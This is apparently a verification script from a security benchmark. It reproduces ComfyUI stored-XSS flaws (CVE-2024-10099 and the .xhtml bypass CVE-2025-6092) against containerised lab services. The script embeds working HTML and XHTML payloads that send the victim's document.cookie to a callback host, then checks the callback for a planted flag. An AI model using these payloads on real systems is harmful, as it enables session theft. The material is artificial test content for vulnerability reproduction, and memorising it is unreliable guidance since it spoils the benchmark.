#!/usr/bin/env bash
# PCBV2-0024 (comfyui-cve-2025-6092)
# seed     = upload payload.html  (CVE-2024-10099). V0 serves text/html -> XSS; V1 ext blocklist -> octet-stream.
# residual = upload payload.xhtml (CVE-2025-6092). V1 .xhtml not in {.html,.htm,.js,.css} -> xhtml+xml -> XSS.
# Effect channel: callback /dump contains the victim cookie (PCB_FLAG planted at start).
# Judge current RUN_FLAG: wrong/stale override changes RUN_FLAG only; cookie still has start token -> 10.
# 0=effect 10=blocked/mismatch 20=env 30=usage
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG="$RUN_FLAG"
mkdir -p "$WORK_DIR"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

APP_PORT="$(dc port "$VERSION" 8188 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
VICTIM_PORT="$(dc port victim 8070 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
CALLBACK_PORT="$(dc port callback 9000 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$APP_PORT" || -z "$VICTIM_PORT" || -z "$CALLBACK_PORT" ]]; then
  echo "verify: compose port failed (need --profile $VERSION) app=$APP_PORT vic=$VICTIM_PORT cb=$CALLBACK_PORT" >&2
  dc ps >&2 || true
  exit 20
fi
export PCB_TARGET_PORT="$APP_PORT"
echo "[verify] ${VERSION} mode=${MODE} app=${APP_PORT} victim=${VICTIM_PORT} callback=${CALLBACK_PORT}"

ready=0
for _ in $(seq 1 60); do
  if "$PY" - "$APP_PORT" "$VICTIM_PORT" "$CALLBACK_PORT" <<'PYEOF' 2>/dev/null; then ready=1; break; fi
import sys, urllib.request
app, vic, cb = sys.argv[1], sys.argv[2], sys.argv[3]
ok = True
for url in (f"http://127.0.0.1:{app}/", f"http://127.0.0.1:{vic}/health", f"http://127.0.0.1:{cb}/health"):
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            if r.getcode() != 200:
                ok = False
    except Exception:
        ok = False
sys.exit(0 if ok else 1)
PYEOF
  sleep 3
done
if [[ "$ready" != 1 ]]; then
  echo "[verify] env not ready (app/victim/callback)" >&2
  dc ps >&2 || true
  dc logs --tail 8 "$VERSION" >&2 || true
  exit 20
fi

# candidate: seed=payload.html / residual=payload.xhtml (inline; no hidden files)
"$PY" - "$MODE" "$WORK_DIR/cand.json" <<'PYEOF'
import json, sys
mode = sys.argv[1]
CB = "//callback:9000/c?f="
if mode == "--seed":
    cand = {"filename": "payload.html",
            "payload": '<html><body><script>document.location="' + CB + '"+document.cookie</script></body></html>'}
else:
    cand = {"filename": "payload.xhtml",
            "payload": '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>x</title></head>'
                       '<body><script type="application/javascript">document.location="' + CB +
                       '"+document.cookie</script></body></html>'}
json.dump(cand, open(sys.argv[2], "w"))
PYEOF

cat > "$WORK_DIR/run_probe_0024.py" <<'PYEOF'
import json, os, sys
import importlib.util
case_dir, cand_path, version = sys.argv[1], sys.argv[2], sys.argv[3]
sys.path.insert(0, case_dir)
spec = importlib.util.spec_from_file_location("poc_common", os.path.join(case_dir, "poc_common.py"))
pc = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pc)
if os.environ.get("PCB_APP_PORT"):
    pc.HOST_APP[version] = "http://127.0.0.1:" + os.environ["PCB_APP_PORT"]
if os.environ.get("PCB_VICTIM_PORT"):
    pc.VICTIM = "http://127.0.0.1:" + os.environ["PCB_VICTIM_PORT"]
if os.environ.get("PCB_CALLBACK_PORT"):
    pc.CALLBACK = "http://127.0.0.1:" + os.environ["PCB_CALLBACK_PORT"]
sys.modules["poc_common"] = pc
spec2 = importlib.util.spec_from_file_location("seed_exec", os.path.join(case_dir, "poc", "seed_exec.py"))
se = importlib.util.module_from_spec(spec2)
spec2.loader.exec_module(se)
cand = json.load(open(cand_path))
r = se.run_probe(cand, version=version)
print(json.dumps(r, default=str))
PYEOF

export PCB_APP_PORT="$APP_PORT" PCB_VICTIM_PORT="$VICTIM_PORT" PCB_CALLBACK_PORT="$CALLBACK_PORT"
curl -s -m 3 -o /dev/null "http://127.0.0.1:$CALLBACK_PORT/reset" || true
OUT="$("$PY" "$WORK_DIR/run_probe_0024.py" "$CASE_DIR" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" \
  || { echo "$OUT" >&2
       echo "[diag] compose port lookup used --profile $VERSION" >&2
       dc logs --tail 8 callback >&2 || true
       exit 20; }
echo "$OUT" | head -c 400; echo

# callback dump must contain the CURRENT RUN_FLAG (cookie was planted at start as PCB_FLAG).
if grep -qF "$FLAG" <<< "$OUT"; then rc=0; else rc=10; fi
echo "[verify] verdict rc=${rc}"
exit "$rc"
